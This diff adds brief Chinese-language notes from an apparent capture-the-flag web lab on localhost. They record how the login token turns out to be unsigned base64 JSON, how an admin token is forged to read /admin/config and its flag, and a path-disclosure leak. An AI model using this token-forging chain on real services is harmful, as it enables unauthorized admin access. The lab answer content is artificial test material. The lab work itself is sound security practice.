@@ -1,0 +1,9 @@
+GET http://127.0.0.1:18081/login -> {"token": "eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9", "uid": "1"}   解码: {"uid": "1", "user": ""}
+POST /login body {"user":"admin"} 或 GET /login?user=admin -> {"token": "eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=", "uid": "2"}   解码: {"uid": "2", "user": "admin"}
+token 即 base64(json)，客户端可控 user 字段，可直接铸造 admin token。
+GET /admin/config 无 token -> 403 {"error": "admin only"}
+GET /admin/config -H "Authorization: Bearer eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9" -> 403 admin only
+GET /admin/config -H "Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=" -> 200
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+鉴权对比: GET /notes?id=1 带 Bearer(普通 token) -> viewer 由 null 变为 "1"，证实 Authorization: Bearer 为有效 token 传递方式。
+GET /files?name=... -> 404 并回显服务端路径 .../labs/weblab-api/<name>（信息泄露，但靶场内无该文件，未利用）。
